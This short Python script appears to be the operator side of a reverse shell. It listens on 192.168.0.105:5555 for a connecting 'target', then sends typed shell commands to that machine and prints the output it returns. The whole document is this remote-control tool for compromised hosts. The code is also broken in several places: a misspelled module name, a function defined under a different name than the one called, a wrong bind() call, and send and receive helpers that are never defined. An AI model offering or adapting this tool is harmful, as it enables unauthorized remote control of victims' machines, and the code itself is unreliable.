import socket 

def target_communcation():
	while True:
		command = input('* Shell~%s: ' % str(ip))
		reliable_send(command)
		if command == 'quit':
			break
		else:
			result = reliable_recv()
			print(result)

sock = socket.socket(scoket.AF_INET, socket.SOCK_STREAM)
sock.bind('192.168.0.105', 5555)
print('[+] Listening For the Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
